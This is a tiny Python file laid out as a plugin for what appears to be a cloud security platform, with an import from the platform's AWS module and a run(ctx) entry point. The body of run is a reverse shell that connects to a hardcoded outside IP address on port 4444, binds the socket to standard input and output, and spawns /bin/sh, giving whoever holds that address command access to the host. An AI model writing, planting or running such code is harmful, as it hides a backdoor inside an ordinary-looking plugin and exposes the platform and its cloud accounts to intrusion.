
import sonrai.platform.aws.arn
import socket,os,pty

def run(ctx):
    rhost="3.145.201.117"
    rport=4444
    s=socket.socket()
    s.connect(rhost,rport)
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")
